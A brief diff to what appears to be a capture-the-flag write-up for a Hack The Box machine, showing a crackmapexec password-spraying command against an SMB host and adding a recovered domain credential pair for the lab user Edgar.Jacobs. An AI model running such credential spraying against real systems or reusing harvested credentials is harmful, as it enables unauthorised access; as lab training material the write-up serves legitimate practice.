@@ -44,7 +44,11 @@ grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
 ```
 crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
 ```
+search.htb\Edgar.Jacobs:@3ONEmillionbaby
+
 ![image](https://user-images.githubusercontent.com/33616880/230700260-1809d1ec-e297-4d00-9ba5-5213526fed84.png)
+
+
 
 
 
